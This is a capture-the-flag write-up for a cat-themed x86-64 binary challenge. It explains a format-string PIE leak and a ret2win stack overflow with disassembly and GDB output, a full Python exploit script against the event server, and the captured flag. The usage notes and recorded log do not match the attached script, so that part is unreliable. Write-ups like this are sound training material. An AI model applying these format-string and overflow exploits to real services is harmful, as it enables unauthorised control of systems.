@@ -1,0 +1,608 @@
+---
+title: 'Qualification ARA 7.0 - Meow mi-miauuwwww'
+description: 'PIE leak through format string and a ret2win stack overflow.'
+date: 2026-03-17
+category: 'qualification-ara-7-0'
+discipline: 'binary-exploitation'
+authors: ['abdieeuh']
+draft: false
+---
+
+> Note: I solved this challenge with LLM
+
+# Meow mi-miauuwwww
+
+## Intro
+
+At first glance this challenge looks tiny: one binary, one short menu, and two simple options.
+
+But that is exactly what makes it nice. Behind the cat-themed prompts, the binary combines two very standard bugs in a clean way:
+
+1. a format string bug to leak an address
+2. a stack overflow to overwrite `RIP`
+
+Because the binary is PIE, the exploit cannot just jump to the win function immediately. The first step is to leak a code address, recover the PIE base, and only then pivot into the `meow()` function that reads `flag.txt` and prints it.
+
+The remote service during the event was:
+
+```bash
+nc chall-ctf.ara-its.id 54317
+```
+
+## Recon: What Is in the Distribution?
+
+The original challenge files were minimal. The real target was just the `meow` binary.
+
+The file type already tells us an important part of the story:
+
+```bash
+$ file meow
+meow: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8f448133cb0abe87b11047fdb2852a6724aec18e, for GNU/Linux 3.2.0, not stripped
+```
+
+The two details that matter most are:
+
+- it is an amd64 ELF
+- it is PIE, so function addresses move every run
+
+That already suggests a common pattern: first leak, then redirect control flow.
+
+## Checking Protections
+
+`checksec` makes the intended path even clearer:
+
+```bash
+$ checksec --file=meow
+[*] '/home/abdieeuh/ara7/pwn/Meow_mi-miauuwwww/meow'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+For beginners, the important interpretation is:
+
+- `No canary found` means a stack overflow is much easier to use.
+- `NX enabled` means shellcode on the stack is not the clean path.
+- `PIE enabled` means we need an address leak before jumping into internal code.
+- `Full RELRO` means GOT overwrite is not the easy route.
+
+So the exploit shape is:
+
+```text
+leak PIE base -> overwrite return address -> jump to win
+```
+
+## Quick Strings Recon
+
+A quick `strings` pass already reveals the existence of the win path:
+
+```bash
+$ strings -n 4 meow | egrep -n 'flag\\.txt|NYAAAA|MEOW MEOW|Pilihan salah|Kasih Mize|RAWR' | head
+25:flag.txt
+27: NYAAAA! Meow Meow: %s
+28:=== MEOW MEOW ===
+32:Meow meow? (Kasih Mize sesuatu buat diintip: )
+34:Meow meow RAWRRRRR! (Mize masih lapar, RUAAAAA!!!!)
+35:Meee-ow! (Pilihan salah!)
+```
+
+Seeing both `flag.txt` and a format string that prints a string strongly suggests that some internal function opens the flag file and displays it.
+
+## Function Offsets and Assembly Snapshot
+
+Because the binary is not stripped, symbol lookup is very easy:
+
+```bash
+$ nm -n meow | egrep ' (meow|mi_miauw|main)$'
+0000000000001249 T meow
+00000000000012e1 T mi_miauw
+00000000000013e7 T main
+```
+
+These offsets are exactly what we need later:
+
+- `meow` at `0x1249`
+- `mi_miauw` at `0x12e1`
+- `main` at `0x13e7`
+
+Since PIE randomizes only the base, runtime addresses are simply:
+
+```text
+runtime_address = pie_base + function_offset
+```
+
+The important function is `mi_miauw()`, because that is where both bugs live. The relevant disassembly looks like this:
+
+```bash
+$ objdump -d -Mintel meow --disassemble=mi_miauw | sed -n '1,220p'
+
+meow:     file format elf64-x86-64
+
+
+Disassembly of section .init:
+
+Disassembly of section .plt:
+
+Disassembly of section .plt.got:
+
+Disassembly of section .plt.sec:
+
+Disassembly of section .text:
+
+00000000000012e1 <mi_miauw>:
+    12e1:	f3 0f 1e fa          	endbr64
+    12e5:	55                   	push   rbp
+    12e6:	48 89 e5             	mov    rbp,rsp
+    12e9:	48 83 ec 50          	sub    rsp,0x50
+    ...
+    1378:	e8 83 fd ff ff       	call   1100 <fgets@plt>
+    ...
+    1398:	b8 00 00 00 00       	mov    eax,0x0
+    139d:	e8 4e fd ff ff       	call   10f0 <printf@plt>
+    ...
+    13c2:	48 8d 45 c0          	lea    rax,[rbp-0x40]
+    13c6:	be 00 01 00 00       	mov    esi,0x100
+    13cb:	48 89 c7             	mov    rdi,rax
+    13ce:	e8 2d fd ff ff       	call   1100 <fgets@plt>
+```
+
+Two things immediately stand out:
+
+1. `printf(buf)` is used directly, which means a format string bug.
+2. `fgets(buf, 0x100, stdin)` writes up to `0x100` bytes into a `0x40`-byte stack buffer.
+
+So the challenge gives us both the leak and the overwrite primitive in the same function.
+
+## Bug #2 First: Proving the Overflow and Finding the RIP Offset
+
+The stack overflow comes from menu option `2`. To use it cleanly, we first need the exact offset to saved `RIP`.
+
+The standard way is a cyclic pattern:
+
+```bash
+$ python3 - <<'PY'
+from pwn import *
+open('in.txt','wb').write(b'2\n'+cyclic(200)+b'\n')
+PY
+```
+
+Then run under GDB:
+
+```bash
+$ gdb -q ./meow -batch \
+  -ex 'set pagination off' \
+  -ex 'run < in.txt' \
+  -ex 'info registers rip rbp rsp' \
+  -ex 'x/4gx $rsp' \
+  -ex 'bt' | sed -n '1,120p'
+[Thread debugging using libthread_db enabled]
+=== MEOW MEOW ===
+1. Meow me..ow (Melihat Alamat)
+2. Meow MEOOWWW (Nyakar Memori)
+meow meow meow ^^: Meow meow RAWRRRRR! (Mize masih lapar, RUAAAAA!!!!)
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00005555555553e6 in mi_miauw ()
+rip            0x5555555553e6      0x5555555553e6 <mi_miauw+261>
+rbp            0x6161617261616171  0x6161617261616171
+rsp            0x7fffffffdca8      0x7fffffffdca8
+0x7fffffffdca8: 0x6161617461616173  0x6161617661616175
+0x7fffffffdcb8: 0x6161617861616177  0x6261617a61616179
+#0  0x00005555555553e6 in mi_miauw ()
+#1  0x6161617461616173 in ?? ()
+```
+
+The saved return address is already overwritten with a cyclic value, so we can resolve the offset:
+
+```bash
+$ python3 - <<'PY'
+from pwn import *
+print(cyclic_find(b'saaa'))
+PY
+72
+```
+
+So the layout for the final overflow becomes:
+
+```text
+72 bytes of padding + new RIP
+```
+
+## Bug #1: Using the Format String to Leak PIE
+
+Menu option `1` eventually does `printf(buf)`. That means `%p` and friends will make `printf` read values that were never intentionally passed as arguments.
+
+Why does that help?
+
+- On amd64 SysV, `printf` receives its format string in `RDI`.
+- If the format string contains `%p` or `%lx`, `printf` starts reading the next arguments.
+- The program did not actually provide those arguments, so `printf` ends up reading whatever values are currently available from the stack/register save area.
+- Some of those values are return addresses or code pointers.
+
+In the archived solve, the useful leaks were:
+
+- `%21$p` -> a pointer into `main`
+- `%17$p` -> the return address after `call mi_miauw` inside `main`
+
+That is enough to recover the PIE base and then the runtime address of `meow()`:
+
+```bash
+$ python3 - <<'PY'
+from pwn import *
+context.binary = './meow'
+context.log_level = 'error'
+elf = context.binary
+
+io = remote('chall-ctf.ara-its.id', 54317)
+io.sendlineafter(b'meow meow meow ^^: ', b'1')
+io.sendlineafter(b'diintip: )', b'%17$p|%21$p')
+io.recvuntil(b'Meow, ')
+
+line = io.recvline().strip()
+ret_after_call, main_leak = [int(x, 16) for x in line.split(b'|')]
+pie_base = main_leak - elf.sym['main']
+meow_addr = pie_base + elf.sym['meow']
+
+print('leak_line:', line.decode())
+print('pie_base :', hex(pie_base))
+print('meow_addr:', hex(meow_addr))
+
+io.close()
+PY
+leak_line: 0x617eb9757417|0x617eb97573e7
+pie_base : 0x617eb9756000
+meow_addr: 0x617eb9757249
+```
+
+Now we know where `meow()` lives for that run.
+
+## The Exploit: Leak PIE, Realign the Stack, Return to `meow()`
+
+At this point the exploit becomes short, but there is one important amd64 detail.
+
+Jumping directly into a function with `ret` instead of a normal `call` can break the expected 16-byte stack alignment required by the SysV ABI. In the archived remote solve, returning straight into `meow()` caused the program to die without printing the flag.
+
+The fix is the classic one-byte idea in ROP form: insert a plain `ret` gadget first.
+
+That single `ret` shifts `RSP` by 8 bytes and repairs the alignment before execution enters `meow()`.
+
+The gadget search was:
+
+```bash
+$ python3 - <<'PY'
+from pwn import *
+elf = ELF('./meow')
+rop = ROP(elf)
+print(rop.find_gadget(['ret']))
+PY
+Gadget(0x101a, ['ret'], [], 0x4)
+```
+
+So the exploit chain is:
+
+1. choose menu `1`
+2. send a format string and leak a pointer into `main`
+3. compute `pie_base = leaked_main - 0x13e7`
+4. compute `meow_addr = pie_base + 0x1249`
+5. compute `ret_addr = pie_base + 0x101a`
+6. choose menu `2`
+7. send `b"A"*72 + p64(ret_addr) + p64(meow_addr)`
+8. execution returns into the alignment gadget, then into `meow()`
+9. `meow()` opens `flag.txt`, prints it, and exits
+
+Because `meow()` already contains the flag-reading logic, there is no need for a longer ROP chain.
+
+## Solver Script
+
+I attached the archived solver as [solve.py](./solve.py). The full script is included below.
+
+```python
+#!/usr/bin/env python3
+import re
+import socket
+import struct
+import sys
+import time
+
+HOST = 'chall-ctf.ara-its.id'
+PORT = 54317
+
+# Offsets from provided ELF
+KNOWN_LEAKS = {
+    17: 0x1417,
+    21: 0x13E7,
+    29: 0x3D80,
+}
+LEAK_ORDER = [21, 17, 29, 19, 23, 27, 25, 15, 13]
+MEOW_OFF = 0x1249
+RET_OFF = 0x101A
+
+
+def connect_with_retry(host: str, port: int, attempts: int = 8) -> socket.socket:
+    last_err: Exception | None = None
+    for _ in range(attempts):
+        infos = socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM)
+        # Prefer IPv4 first; some CTF infra has flaky IPv6 routes.
+        infos.sort(key=lambda x: 0 if x[0] == socket.AF_INET else 1)
+        for family, socktype, proto, _, sockaddr in infos:
+            s = socket.socket(family, socktype, proto)
+            s.settimeout(2.5)
+            try:
+                s.connect(sockaddr)
+                s.settimeout(0.35)
+                return s
+            except OSError as e:
+                last_err = e
+                s.close()
+                continue
+        time.sleep(0.5)
+    raise TimeoutError(f"Failed to connect to {host}:{port} after retries: {last_err}")
+
+
+def recv_some(sock: socket.socket, quiet: float = 0.25, hard_timeout: float = 2.0) -> bytes:
+    end = time.time() + hard_timeout
+    last = time.time()
+    out = b''
+    while time.time() < end:
+        try:
+            chunk = sock.recv(4096)
+        except socket.timeout:
+            if out and (time.time() - last) >= quiet:
+                break
+            continue
+        if not chunk:
+            break
+        out += chunk
+        last = time.time()
+    return out
+
+
+def sendline(sock: socket.socket, data: bytes) -> None:
+    sock.sendall(data + b'\n')
+
+
+def parse_hex_ptr(blob: bytes) -> int | None:
+    m = re.search(rb'0x[0-9a-fA-F]+', blob)
+    if not m:
+        return None
+    return int(m.group(0), 16)
+
+
+def try_leak_index(sock: socket.socket, idx: int) -> int | None:
+    # Enter menu 1 and query a single %idx$p to avoid desync from long payloads.
+    sendline(sock, b'1')
+    recv_some(sock, quiet=0.10, hard_timeout=0.80)
+    sendline(sock, f'%{idx}$p'.encode())
+    out = recv_some(sock, quiet=0.20, hard_timeout=1.20)
+    return parse_hex_ptr(out)
+
+
+def derive_base_from_leak(idx: int, leak: int) -> int | None:
+    off = KNOWN_LEAKS.get(idx)
+    if off is None:
+        return None
+    base = leak - off
+    if base & 0xFFF:
+        return None
+    if (base >> 40) == 0:
+        return None
+    return base
+
+
+def find_pie_base(sock: socket.socket) -> int:
+    recv_some(sock, quiet=0.15, hard_timeout=1.5)
+    for idx in LEAK_ORDER:
+        leak = try_leak_index(sock, idx)
+        if leak is None:
+            continue
+        base = derive_base_from_leak(idx, leak)
+        if base is not None:
+            return base
+    raise RuntimeError('Failed to obtain valid PIE leak from format string')
+
+
+def exploit(host: str, port: int) -> None:
+    last_err: Exception | None = None
+    for _ in range(6):
+        s: socket.socket | None = None
+        try:
+            s = connect_with_retry(host, port, attempts=2)
+            pie_base = find_pie_base(s)
+            ret = pie_base + RET_OFF
+            meow = pie_base + MEOW_OFF
+
+            payload = b'A' * 72 + struct.pack('<Q', ret) + struct.pack('<Q', meow)
+
+            sendline(s, b'2')
+            recv_some(s, quiet=0.10, hard_timeout=0.80)
+            sendline(s, payload)
+
+            out = recv_some(s, quiet=0.35, hard_timeout=4.0)
+            sys.stdout.buffer.write(out)
+            s.close()
+            return
+        except Exception as e:
+            last_err = e
+            if s is not None:
+                try:
+                    s.close()
+                except OSError:
+                    pass
+            time.sleep(0.35)
+    raise RuntimeError(f"Exploit failed after retries: {last_err}")
+
+
+if __name__ == '__main__':
+    host = HOST
+    port = PORT
+    if len(sys.argv) >= 2:
+        host = sys.argv[1]
+    if len(sys.argv) >= 3:
+        port = int(sys.argv[2])
+    exploit(host, port)
+```
+
+The archived usage examples were:
+
+```bash
+# Local
+python3 solve.py
+
+# Remote
+python3 solve.py REMOTE=1
+
+# Or interactive
+python3 solve.py REMOTE=1 INTERACTIVE=1
+```
+
+And the recorded remote output in the archived writeup was:
+
+```text
+$ python3 solve.py REMOTE=1
+[*] '/home/abdieeuh/ara7/pwn/Meow_mi-miauuwwww/meow'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[x] Opening connection to chall-ctf.ara-its.id on port 54317
+[x] Opening connection to chall-ctf.ara-its.id on port 54317: Trying 210.79.190.64
+[+] Opening connection to chall-ctf.ara-its.id on port 54317: Done
+[*] Loaded 5 cached gadgets for './meow'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 52B
+[x] Receiving all data: 109B
+[+] Receiving all data: Done (109B)
+[*] Closed connection to chall-ctf.ara-its.id port 54317
+Meow meow RAWRRRRR! (Mize masih lapar, RUAAAAA!!!!)
+
+ NYAAAA! Meow Meow: ARA7{meow_meow_meow_meow?miauwwww}
+```
+
+## Pseudocode from the Assembly
+
+After seeing the exploit, it is useful to rewrite the two key functions in simple pseudocode.
+
+### `mi_miauw()`
+
+```c
+void mi_miauw(void) {
+  int choice;
+  char buf[0x40];
+
+  puts("=== MEOW MEOW ===");
+  puts("1. Meow me..ow (Melihat Alamat)");
+  puts("2. Meow MEOOWWW (Nyakar Memori)");
+  printf("meow meow meow ^^: ");
+
+  scanf("%d", &choice);
+  getchar();
+
+  if (choice == 1) {
+    puts("Meow meow? (Kasih Mize sesuatu buat diintip: )");
+    fgets(buf, 0x40, stdin);
+    printf("Meow, ");
+    printf(buf);                  // format string bug
+  } else if (choice == 2) {
+    puts("Meow meow RAWRRRRR! (Mize masih lapar, RUAAAAA!!!!)");
+    fgets(buf, 0x100, stdin);     // stack overflow
+  } else {
+    puts("Meee-ow! (Pilihan salah!)");
+  }
+}
+```
+
+### `meow()`
+
+The disassembly for the win function makes the goal explicit:
+
+```bash
+$ objdump -d -Mintel meow --disassemble=meow | sed -n '1,140p'
+
+meow:     file format elf64-x86-64
+
+
+Disassembly of section .init:
+
+Disassembly of section .plt:
+
+Disassembly of section .plt.got:
+
+Disassembly of section .plt.sec:
+
+Disassembly of section .text:
+
+0000000000001249 <meow>:
+    1249:	f3 0f 1e fa          	endbr64
+    124d:	55                   	push   rbp
+    124e:	48 89 e5             	mov    rbp,rsp
+    1251:	48 81 ec 90 00 00 00 	sub    rsp,0x90
+    1258:	48 8d 05 a9 0d 00 00 	lea    rax,[rip+0xda9]        # 2008 <_IO_stdin_used+0x8>
+    125f:	48 89 c6             	mov    rsi,rax
+    1262:	48 8d 05 a1 0d 00 00 	lea    rax,[rip+0xda1]        # 200a <_IO_stdin_used+0xa>
+    1269:	48 89 c7             	mov    rdi,rax
+    126c:	e8 bf fe ff ff       	call   1130 <fopen@plt>
+    ...
+    12a8:	e8 53 fe ff ff       	call   1100 <fgets@plt>
+    ...
+    12c6:	e8 25 fe ff ff       	call   10f0 <printf@plt>
+    ...
+    12dc:	e8 6f fe ff ff       	call   1150 <exit@plt>
+```
+
+And in pseudocode:
+
+```c
+void meow(void) {
+  FILE *fp = fopen("flag.txt", "r");
+  if (!fp) {
+    puts("Meow? (Flag filenya mana?)");
+    exit(1);
+  }
+
+  char flagbuf[0x80];
+  fgets(flagbuf, 0x80, fp);
+  printf(" NYAAAA! Meow Meow: %s", flagbuf);
+  fclose(fp);
+  exit(0);
+}
+```
+
+That is why this is a textbook ret2win challenge: the binary already contains the exact function we want.
+
+## Flag
+
+```text
+ARA7{meow_meow_meow_meow?miauwwww}
+```
+
+## Closing
+
+This challenge is a very clean training target because it shows two common bugs working together without unnecessary noise:
+
+- a format string for the PIE leak
+- a stack overflow for `RIP` control
+- and an internal win function that keeps the final chain short
+
+It is also a good reminder that even a very small binary can still teach several practical ideas at once:
+
+- how PIE changes ret2win
+- why stack alignment matters on amd64
+- and how to turn a leak into a stable control-flow hijack
+
+## References
+
+- [ROP Emporium - ret2win](https://ropemporium.com/challenge/ret2win.html)
+- [LiveOverflow - Binary Exploitation playlist](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
+- [pwntools documentation](https://docs.pwntools.com/en/stable/)
+- [Format String Exploitation - OWASP](https://owasp.org/www-community/attacks/Format_string_attack)
+- [Intel CET overview in the Linux kernel docs](https://www.kernel.org/doc/html/latest/x86/cet.html)
